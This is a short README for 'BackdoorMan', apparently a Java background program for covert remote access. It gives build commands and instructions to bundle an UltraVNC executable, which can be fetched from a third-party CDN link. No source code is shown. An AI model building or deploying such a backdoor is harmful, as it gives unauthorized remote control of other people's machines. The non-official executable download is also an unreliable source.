# BackdoorMan

BackdoorMan is a fairly simple program that runs in the background doing some naughty stuff >:)

## Compile it yourself
```bash
git clone https://github.com/freedombrowser/BackdoorMan.git
cd BackdoorMan
mvn clean install
mvn package
```
The jar file should now be located in ./target<br>
**You will need to put an UltraVNC *winvnc.exe* file in the same directory as the jar.**<br>
Download it from the official website [here](https://uvnc.com/downloads/ultravnc/)<br>
or download it directly from freedombrowser [here](https://stonklat.com/cdn/exe/winvnc.exe)
